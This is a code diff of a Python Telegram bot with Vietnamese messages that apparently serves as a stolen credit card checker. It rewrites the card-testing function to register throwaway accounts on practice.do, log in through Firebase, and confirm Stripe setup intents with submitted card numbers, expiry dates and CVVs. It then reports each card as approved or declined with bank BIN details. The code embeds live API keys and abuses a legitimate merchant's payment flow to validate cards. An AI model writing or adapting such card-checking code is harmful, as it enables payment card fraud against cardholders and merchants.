@@ -18,58 +18,111 @@ HEADERS = {
 
 # ========== HÀM XỬ LÝ THẺ ========== #
 async def process_card(cc, mes, ano, cvv, user_id=None):
+    import string, random
+
+    def random_email():
+        local = ''.join(random.choices(string.ascii_lowercase, k=19))
+        return f"{local}62@gmail.com"
+
+    email = random_email()
+    password = "Minhnhat##123"
+    first_name = "Nhat"
+    last_name = "Minh"
     bin_code = cc[:6]
     start_time = time.time()
+
     try:
-        r1 = requests.get("https://urbanflixtv.com/account/purchases/payment_methods", headers=HEADERS)
-        soup = BeautifulSoup(r1.text, "html.parser")
-        token_tag = soup.find("meta", {"name": "csrf-token"})
-        if not token_tag:
-            return "❌ Không lấy được CSRF token."
+        # Step 1: Register user
+        r1 = requests.post(
+            "https://app.practice.do/api/v1/users/create",
+            json={"email": email, "isCoach": True, "password": password, "firstName": first_name, "lastName": last_name},
+            headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                "Pragma": "no-cache",
+                "Accept": "*/*",
+                "Content-Type": "application/json"
+            }
+        )
 
-        # Retry tối đa 5 lần nếu lỗi setup_intent
-        setid = ""
-        for attempt in range(5):
-            r2 = requests.get("https://urbanflixtv.com/api/billings/setup_intent?page=payment_methods&currency=usd", headers=HEADERS)
-            if r2.status_code == 200:
-                try:
-                    setid = r2.json().get("setup_intent", "")
-                    if setid:
-                        break
-                except Exception:
-                    pass
-            time.sleep(1)
-        if not setid:
-            return "❌ Lỗi lấy setup_intent (sau 5 lần thử)"
+        if "Email already in use" in r1.text:
+            return "⚠️ Email already in use. Retrying might help."
+        if "userId" not in r1.text:
+            return "❌ Failed to create account."
 
-        setin = setid.split("_secret_")[0]
+        # Step 2: Login to Firebase
+        r2 = requests.post(
+            "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyChZfnLzMeEIDjQ8XSw3y9sO7jp0O4lkIk",
+            json={"returnSecureToken": True, "email": email, "password": password, "clientType": "CLIENT_TYPE_WEB"},
+            headers={
+                "User-Agent": "Mozilla/5.0",
+                "Pragma": "no-cache",
+                "Accept": "*/*",
+                "Content-Type": "application/json"
+            }
+        )
+        tk = r2.json().get("idToken")
+        if not tk:
+            return "❌ Login failed."
 
-        payload = {
-            "return_url": "https://urbanflixtv.com/account/purchases/payment_methods/async_method_setup",
-            "payment_method_data[type]": "card",
-            "payment_method_data[card][number]": cc,
-            "payment_method_data[card][cvc]": cvv,
-            "payment_method_data[card][exp_year]": ano,
-            "payment_method_data[card][exp_month]": mes,
-            "payment_method_data[billing_details][address][country]": "VN",
-            "use_stripe_sdk": "true",
-            "key": "pk_live_DImPqz7QOOyx70XCA9DSifxb",
-            "_stripe_account": "acct_1Cmk2bLbC5cLZDVD",
-            "client_secret": setid
-        }
+        # Step 3: Create Setup Intent
+        r3 = requests.post(
+            "https://app.practice.do/api/v1/users/zy9ODRErt6VR2i98vmtMUPNkL533/stripe/setup-intent",
+            headers={
+                "host": "app.practice.do",
+                "accept": "application/json, text/plain, */*",
+                "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8",
+                "cache-control": "no-cache",
+                "origin": "https://app.practice.do",
+                "pragma": "no-cache",
+                "user-agent": "Mozilla/5.0",
+                "cookie": f"firebase_token={tk}",
+                "content-type": "application/x-www-form-urlencoded"
+            },
+            data=""
+        )
+        src = r3.text
+        if "clientSecret" not in src:
+            return "❌ Failed to get clientSecret."
 
-        r3 = requests.post(f"https://api.stripe.com/v1/setup_intents/{setin}/confirm", headers=HEADERS, data=payload)
-        j3 = r3.json()
-        status = j3.get("status", "UNKNOWN")
-        decline = j3.get("error", {}).get("decline_code", "NONE")
+        import re
+        import urllib.parse
+        client_secret = re.search(r'"clientSecret":"(.*?)"', src).group(1)
+        intent_id = client_secret.split("_secret_")[0]
 
-        bin_res = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}")
-        bin_json = bin_res.json()
-        card = bin_json.get("scheme", "N/A")
-        type_ = bin_json.get("type", "N/A")
-        brand = bin_json.get("brand", "N/A")
-        alpha2 = bin_json.get("country", {}).get("alpha2", "N/A")
-        bank = bin_json.get("bank", {}).get("name", "N/A")
+        # Step 4: Confirm SetupIntent via Stripe
+        encoded_email = urllib.parse.quote(email)
+        payload = f"return_url=https%3A%2F%2Fapp.practice.do%2Fstart-trial%3Fstep%3D2%26email%3D{encoded_email}%26planInformation%3D%257B...%257D&" \
+                  f"payment_method_data[type]=card&" \
+                  f"payment_method_data[card][number]={cc}&" \
+                  f"payment_method_data[card][cvc]={cvv}&" \
+                  f"payment_method_data[card][exp_year]={ano}&" \
+                  f"payment_method_data[card][exp_month]={mes}&" \
+                  f"payment_method_data[billing_details][address][country]=VN&" \
+                  f"use_stripe_sdk=true&" \
+                  f"key=pk_live_8vuRcdG8hx5kBi7MTtoqIeCc00alpMFwtE&" \
+                  f"client_secret={client_secret}"
+
+        r4 = requests.post(
+            f"https://api.stripe.com/v1/setup_intents/{intent_id}/confirm",
+            headers={
+                "User-Agent": "Mozilla/5.0",
+                "Pragma": "no-cache",
+                "Accept": "*/*",
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            data=payload
+        )
+        j4 = r4.json()
+        status = j4.get("status", "UNKNOWN")
+        decline = j4.get("error", {}).get("decline_code", "NONE")
+
+        # BIN Lookup
+        bin_info = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}").json()
+        scheme = bin_info.get("scheme", "N/A")
+        type_ = bin_info.get("type", "N/A")
+        brand = bin_info.get("brand", "N/A")
+        country = bin_info.get("country", {}).get("alpha2", "N/A")
+        bank = bin_info.get("bank", {}).get("name", "N/A")
 
         elapsed = round(time.time() - start_time, 2)
         return f"""
@@ -79,18 +132,18 @@ async def process_card(cc, mes, ano, cvv, user_id=None):
 <b>Status:</b> {'✅ Approved' if status == 'succeeded' else '❌ Declined'}
 <b>Decline Code:</b> {decline}
 
-<b>Gateway:</b> Stripe
-<b>Card:</b> {card.upper()}
+<b>Gateway:</b> Stripe (Practice.do)
+<b>Card:</b> {scheme.upper()}
 <b>Type:</b> {type_.capitalize()}
 <b>Brand:</b> {brand}
-<b>Alpha2:</b> {alpha2}
+<b>Alpha2:</b> {country}
 <b>Bank:</b> {bank}
 
 <b>Took:</b> {elapsed} sec
 <b>Checked by:</b> mnhat [{user_id}]
 """
     except Exception as e:
-        return f"❌ Lỗi xử lý: {str(e)}"
+        return f"❌ Error: {str(e)}"
 
 # ========== CÁC HÀM COMMAND ========== #
 async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -182,50 +235,16 @@ async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Lỗi: {str(e)}")
 
 async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if context.args:
-        query = context.args[0]
-        if query.startswith('@'):
-            # Lookup by username
-            try:
-                chat = await context.bot.get_chat(query)
-                msg = f"""
-👤 <b>Thông tin người dùng</b>
-
-<b>Tên:</b> {chat.full_name}
-<b>ID:</b> {chat.id}
-<b>Username:</b> @{chat.username}
-"""
-                await update.message.reply_html(msg)
-            except:
-                await update.message.reply_html(f"❌ Không tìm thấy người dùng <b>{query}</b>.")
-        else:
-            # Assume it's an ID
-            try:
-                user_id = int(query)
-                chat = await context.bot.get_chat(user_id)
-                msg = f"""
-👤 <b>Thông tin người dùng</b>
-
-<b>Tên:</b> {chat.full_name}
-<b>ID:</b> {chat.id}
-<b>Username:</b> @{chat.username}
-"""
-                await update.message.reply_html(msg)
-            except:
-                await update.message.reply_text(f"❌ Không tìm thấy ID {query}.")
-    else:
-        # Trả về info người gọi lệnh
-        user = update.effective_user
-        rank = USER_RANKS.get(user.id, "none")
-        msg = f"""
+    user = update.effective_user
+    rank = USER_RANKS.get(user.id, "none")
+    msg = f"""
 👤 <b>Thông tin người dùng</b>
 
 <b>Tên:</b> {user.full_name}
 <b>ID:</b> {user.id}
-<b>Username:</b> @{user.username}
 <b>Rank:</b> {rank}
 """
-        await update.message.reply_html(msg)
+    await update.message.reply_html(msg)
 
 async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = """
